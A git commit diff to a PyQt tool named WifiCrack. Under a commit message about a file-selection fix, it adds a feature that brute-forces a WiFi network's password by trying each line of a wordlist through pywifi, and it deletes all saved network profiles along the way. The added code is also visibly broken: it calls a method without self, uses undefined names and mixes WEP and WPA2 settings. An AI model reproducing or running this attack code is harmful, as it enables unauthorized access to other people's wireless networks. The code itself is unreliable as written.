0799f634faeff1c08cb95db4b5d66ae49347a404
yqlicglingfei <252661640@qq.com>
2020-09-11 21:35:50 +0800

    fix that select file error

--- wifitest.py
+++ wifitest.py
@@ -25,6 +25,59 @@ class WifiCrack(QWidget):
         self.scanBtn.clicked.connect(self.scanWifi)
         self.wifiList.clicked.connect(self.selectWifi)
         self.loadPwdFileBtn.clicked.connect(self.loadPwdFiles)
+        self.startCrackBtn.clicked.connect(self.crackWifi)
+
+    def crackWifi(self):
+        print("start cracking:")
+        print(self.currentPwdFile)
+        file=open(self.currentPwdFile, "r")
+        while True:
+            try:
+                #一行一行读取
+                pwd=file.readline()
+                bConnected=wifiConnect(pwd)
+                
+                if bConnected:
+                    print("密码已破解： ",pwd)
+                    print("WiFi已自动连接！！！")
+                    break
+                else:
+                    #跳出当前循环，进行下一次循环
+                    print("密码破解中....密码校对: ",pad)
+            except:
+                continue
+
+    def wifiConnect(self, pwd):
+        iface=self.ifaces[self.currentIfaceIdx].disconnect()
+        time.sleep(1)
+        wifistatus=iface.status()
+        if wifistatus==const.IFACE_DISCONNECTED:
+            #创建WiFi连接文件
+            profile=pywifi.Profile()
+            #要连接WiFi的名称
+            profile.ssid=self.currentWifi
+            print(profile.ssid)
+            #网卡的开放状态
+            profile.auth=const.AUTH_ALG_OPEN
+            #wifi加密算法,一般wifi加密算法为wps
+            profile.akm.append(const.AKM_TYPE_WPA2PSK)
+            #加密单元
+            profile.cipher=const.CIPHER_TYPE_WEP
+            #调用密码
+            profile.key=pwd
+            #删除所有连接过的wifi文件
+            iface.remove_all_network_profiles()
+            #设定新的连接文件
+            tep_profile=iface.add_network_profile(profile)
+            iface.connect(tep_profile)
+            #wifi连接时间
+            time.sleep(3)
+            if ifaces.status()==const.IFACE_CONNECTED:
+                return True
+            else:
+                return False
+        else:
+            print("已有wifi连接") 
 
     def scanWifi(self):
         iface=self.ifaces[1]
@@ -39,7 +92,7 @@ class WifiCrack(QWidget):
         self.wifiList.setModel(slm)
 
     def loadPwdFiles(self):
-        self.pwdFiles=QFileDialog.getOpenFileNames(self, 'select files', '', 'txt files(*.txt)')
+        self.pwdFiles, ok=QFileDialog.getOpenFileNames(self, 'select files', '', 'txt files(*.txt)')
         print(self.pwdFiles)
         slm=QStringListModel(self.pwdFiles)
         self.passwordFileList.setModel(slm)
